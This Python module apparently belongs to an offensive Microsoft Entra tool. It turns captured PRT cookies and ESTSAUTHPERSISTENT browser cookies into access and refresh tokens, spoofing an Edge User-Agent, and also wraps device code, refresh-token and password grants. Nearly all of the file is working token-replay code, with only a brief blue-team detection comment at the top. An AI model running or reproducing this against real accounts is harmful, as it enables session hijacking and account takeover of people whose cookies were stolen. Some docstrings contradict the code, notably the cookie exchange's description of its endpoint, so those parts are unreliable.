# ================================================================
# MODULE: quantum_mechanic.providers.entra.exchange
# ----------------------------------------------------------------
# PURPOSE:   Network-touching token exchange operations against
#            Microsoft's ESTS (login.microsoftonline.com) endpoint.
#
#            Covers:
#              - PRT cookie  → access + refresh tokens
#              - ESTS cookie → access + refresh tokens
#              - Device code flow (initiation + polling)
#              - Refresh token  → access token (delegated)
#              - ROPC (username/password)
#
#            All functions return raw response dicts. The caller
#            (commands_entra.py) handles EntraTokenStore updates.
#
# DETECTION (Blue Team):
#   ESTS Sign-in Logs: Non-interactive sign-ins show as the
#   originating client app. PRT cookie exchanges appear as
#   "Primary Refresh Token" auth method in the sign-in log.
# ================================================================

from __future__ import annotations

import logging
import time
from typing import Any

import httpx

logger = logging.getLogger(__name__)

ESTS_BASE = "https://login.microsoftonline.com"
TOKEN_EP  = ESTS_BASE + "/{tenant}/oauth2/v2.0/token"
AUTH_EP   = ESTS_BASE + "/{tenant}/oauth2/v2.0/authorize"
DEVICE_EP = ESTS_BASE + "/{tenant}/oauth2/v2.0/devicecode"

# Legacy v1 token endpoint — required for PRT cookie and ESTS cookie exchange.
TOKEN_V1_EP = ESTS_BASE + "/{tenant}/oauth2/token"

_DEFAULT_TIMEOUT = 30


def exchange_prt_cookie(
    prt_jwt: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Exchange a PRT cookie (x-ms-RefreshTokenCredential) for tokens.

    Uses the jwt-bearer grant against the v1 token endpoint.
    The PRT cookie is nonce-bound (~5 min) — call immediately on ingest.

    Returns:
        Raw ESTS response dict with access_token, refresh_token, etc.
        Error is keyed as "error" / "error_description" on failure.
    """
    url = TOKEN_V1_EP.format(tenant=tenant_id)
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion": prt_jwt,
        "client_id": client_id,
        "resource": resource,
        "scope": "openid",
        "request_nonce": "1",  # signal that we're providing a nonce-bearing PRT cookie
    }
    return _post_token(url, data, http=http)


def exchange_ests_cookie(
    cookie_value: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    cookie_name: str = "ESTSAUTHPERSISTENT",
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Exchange an ESTS browser cookie for tokens.

    Submits the cookie in a form POST to the v1 authorize endpoint,
    which ESTS completes server-side and returns tokens directly.

    Returns:
        Raw ESTS response dict.
    """
    url = TOKEN_V1_EP.format(tenant=tenant_id)
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "client_id": client_id,
        "resource": resource,
        "scope": "openid offline_access",
    }
    headers = {
        "Cookie": f"{cookie_name}={cookie_value}",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
        ),
    }
    return _post_token(url, data, headers=headers, http=http)


def initiate_device_code(
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Start a device code flow.

    Returns a dict with 'user_code', 'verification_uri', 'device_code',
    'expires_in', and 'interval' fields.
    """
    url = DEVICE_EP.format(tenant=tenant_id)
    scope = resource.rstrip("/") + "/.default openid offline_access"
    data = {
        "client_id": client_id,
        "scope": scope,
    }
    owned = http is None
    client = http or httpx.Client(timeout=_DEFAULT_TIMEOUT)
    try:
        resp = client.post(url, data=data)
        return resp.json()
    except httpx.HTTPError as e:
        return {"error": "http_error", "error_description": str(e)}
    finally:
        if owned:
            client.close()


def poll_device_code(
    device_code: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    interval: int = 5,
    timeout: int = 300,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Poll the token endpoint until device code flow completes or expires.

    Yields progress by returning intermediate "authorization_pending"
    responses. Returns the final token response (success or failure).
    """
    url = TOKEN_EP.format(tenant=tenant_id)
    scope = resource.rstrip("/") + "/.default openid offline_access"
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
        "client_id": client_id,
        "scope": scope,
    }

    owned = http is None
    client = http or httpx.Client(timeout=_DEFAULT_TIMEOUT)
    deadline = time.time() + timeout
    try:
        while time.time() < deadline:
            resp = client.post(url, data=data)
            result = resp.json()
            error = result.get("error", "")

            if error == "authorization_pending":
                time.sleep(interval)
                continue
            if error == "slow_down":
                interval += 5
                time.sleep(interval)
                continue
            # Success or terminal failure — return immediately.
            return result

        return {"error": "expired_token", "error_description": "Device code polling timed out"}
    except httpx.HTTPError as e:
        return {"error": "http_error", "error_description": str(e)}
    finally:
        if owned:
            client.close()


def exchange_refresh_token(
    refresh_token: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Exchange a refresh token for an access token against a specific resource."""
    url = TOKEN_EP.format(tenant=tenant_id)
    scope = resource.rstrip("/") + "/.default openid offline_access"
    data = {
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "client_id": client_id,
        "scope": scope,
    }
    return _post_token(url, data, http=http)


def exchange_ropc(
    username: str,
    password: str,
    *,
    tenant_id: str,
    client_id: str,
    resource: str,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    """Resource Owner Password Credentials grant.

    Only works when legacy auth is not blocked and MFA is not required.
    """
    url = TOKEN_EP.format(tenant=tenant_id)
    scope = resource.rstrip("/") + "/.default openid offline_access"
    data = {
        "grant_type": "password",
        "username": username,
        "password": password,
        "client_id": client_id,
        "scope": scope,
    }
    return _post_token(url, data, http=http)


# ----------------------------------------------------------------
# Internal helpers
# ----------------------------------------------------------------

def _post_token(
    url: str,
    data: dict[str, str],
    *,
    headers: dict[str, str] | None = None,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    owned = http is None
    client = http or httpx.Client(timeout=_DEFAULT_TIMEOUT)
    try:
        resp = client.post(url, data=data, headers=headers or {})
        return resp.json()
    except httpx.HTTPError as e:
        logger.debug("ESTS request failed: %s", e)
        return {"error": "http_error", "error_description": str(e)}
    finally:
        if owned:
            client.close()
